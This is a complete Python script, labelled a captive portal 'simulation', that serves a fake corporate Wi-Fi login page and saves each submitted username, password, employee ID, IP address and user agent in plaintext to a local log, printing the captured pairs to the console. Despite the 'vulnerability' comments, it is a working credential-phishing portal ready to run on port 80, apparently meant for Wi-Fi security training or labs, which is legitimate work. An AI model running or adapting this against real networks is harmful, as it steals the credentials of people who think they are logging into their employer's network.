#!/usr/bin/env python3
"""
Captive Portal Simulation
VULNERABILITY: Captures credentials in plaintext
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import json
from datetime import datetime

CREDENTIALS_LOG = "/tmp/captured_creds.log"

HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>Corporate WiFi - Login Required</title>
    <style>
        body { font-family: Arial; background: linear-gradient(135deg, #1e3c72, #2a5298);
               min-height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 350px; }
        h1 { color: #333; margin-bottom: 30px; font-size: 24px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #2a5298; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #1e3c72; }
        .logo { text-align: center; margin-bottom: 20px; font-size: 40px; }
        .terms { font-size: 11px; color: #666; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🏢</div>
        <h1>Corporate Network Access</h1>
        <p>Please authenticate to access the network</p>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="employee_id" placeholder="Employee ID (optional)">
            <button type="submit">Connect to Network</button>
        </form>
        <p class="terms">By connecting, you agree to our acceptable use policy.</p>
        <!-- Debug: Credentials sent to /tmp/captured_creds.log -->
    </div>
</body>
</html>
"""

SUCCESS_HTML = """<!DOCTYPE html>
<html>
<head><title>Connected</title>
<meta http-equiv="refresh" content="3;url=http://example.com">
</head>
<body style="font-family: Arial; text-align: center; padding: 50px;">
<h1>✓ Connected Successfully</h1>
<p>Redirecting you to the internet...</p>
</body>
</html>
"""

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_TEMPLATE.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)

        # VULNERABILITY: Log credentials in plaintext
        creds = {
            'timestamp': datetime.now().isoformat(),
            'ip': self.client_address[0],
            'username': params.get('username', [''])[0],
            'password': params.get('password', [''])[0],
            'employee_id': params.get('employee_id', [''])[0],
            'user_agent': self.headers.get('User-Agent', '')
        }

        with open(CREDENTIALS_LOG, 'a') as f:
            f.write(json.dumps(creds) + '\n')

        print(f"[!] Captured credentials: {creds['username']}:{creds['password']}")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(SUCCESS_HTML.encode())

    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 80), CaptivePortalHandler)
    print("[*] Captive Portal running on port 80")
    server.serve_forever()
